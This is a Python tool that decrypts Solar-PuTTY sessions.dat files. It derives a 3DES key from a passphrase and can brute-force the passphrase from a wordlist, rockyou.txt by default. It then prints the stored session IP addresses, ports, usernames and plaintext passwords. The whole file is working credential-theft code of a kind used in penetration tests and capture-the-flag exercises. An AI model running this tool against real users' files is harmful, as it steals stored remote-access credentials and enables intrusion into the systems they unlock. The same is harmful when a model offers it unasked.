import base64
from Crypto.Cipher import DES3
from Crypto.Protocol.KDF import PBKDF2
import argparse
import json
import os

def decrypt(passphrase, ciphertext):
    data = ''
    try:
        array = base64.b64decode(ciphertext)
        salt = array[:24]
        iv = array[24:32]
        encrypted_data = array[48:]

        key = PBKDF2(passphrase, salt, dkLen=24, count=1000)

        cipher = DES3.new(key, DES3.MODE_CBC, iv)
        decrypted_data = cipher.decrypt(encrypted_data)

        padding_len = decrypted_data[-1]
        decrypted_data = decrypted_data[:-padding_len]

        data = ''.join(chr(c) for c in decrypted_data if chr(c).isascii())

    except Exception as e:
        return None

    return data

def print_highlighted(parsed_data):
    separator = "=" * 50
    if 'Sessions' in parsed_data:
        print(f'\n{separator}')
        print('[ðŸ”’] Sessions:')
        print(f'{separator}')
        for session in parsed_data['Sessions']:
            print(f"    ðŸ”¹ \033[1;34mSession Name:\033[0m \033[1m{session.get('SessionName')}\033[0m")
            print(f"    ðŸ”¹ \033[1;34mIP:\033[0m {session.get('Ip')}")
            print(f"    ðŸ”¹ \033[1;34mPort:\033[0m {session.get('Port')}")
            print()

    if 'Credentials' in parsed_data:
        print(f'{separator}')
        print('[ðŸ”‘] Credentials:')
        print(f'{separator}')
        for cred in parsed_data['Credentials']:
            username = cred.get('Username', 'N/A')
            password = cred.get('Password', 'N/A')

            print(f"    ðŸ”¹ \033[1;32mCredentials Name:\033[0m \033[1m{cred.get('CredentialsName')}\033[0m")
            print(f"    ðŸ”¹ \033[1;32mUsername:\033[0m \033[1;32m{username}\033[0m")
            print(f"    ðŸ”¹ \033[1;31mPassword:\033[0m \033[1;31m{password}\033[0m")
            print()

def brute_force(wordlist_path, ciphertext):
    if not os.path.exists(wordlist_path):
        print(f"[!] Wordlist file not found: {wordlist_path}")
        return None, None

    print(f"[+] Starting brute force using wordlist: {wordlist_path}")

    with open(wordlist_path, 'r', encoding="latin-1") as f:
        for i, password in enumerate(f):
            password = password.strip()
            decrypted = decrypt(password, ciphertext)
            if decrypted:
                try:
                    json.loads(decrypted)
                    return decrypted, password
                except json.JSONDecodeError:
                    continue

    return None, None

def main():
    parser = argparse.ArgumentParser(description="Decrypt Solar Putty session files.")
    parser.add_argument('filepath', type=str, help='Path to the sessions.dat file.')
    parser.add_argument('password', nargs='?', default=None, help='Password for decryption (leave blank if using --brute).')
    parser.add_argument('--raw', action='store_true', help='Print the raw decrypted JSON output.')
    parser.add_argument('--brute', nargs='?', const='/usr/share/wordlists/rockyou.txt', help='Brute force the password using a wordlist. Defaults to /usr/share/wordlists/rockyou.txt.')

    args = parser.parse_args()

    with open(args.filepath, 'r') as f:
        cipher = f.read()

    if args.brute:
        decrypted, found_password = brute_force(args.brute, cipher)
        if decrypted:
            print(f"\n[âœ…] Password found: \033[1;32m{found_password}\033[0m\n")
        else:
            print("[!] No valid password found in the wordlist.")
            return
    else:
        decrypted = decrypt(args.password, cipher)

    if decrypted:
        parsed_data = json.loads(decrypted)

        if args.raw:
            print(json.dumps(parsed_data, indent=4))
        else:
            print_highlighted(parsed_data)
    else:
        print('[!] Decryption failed.')

if __name__ == '__main__':
    main()
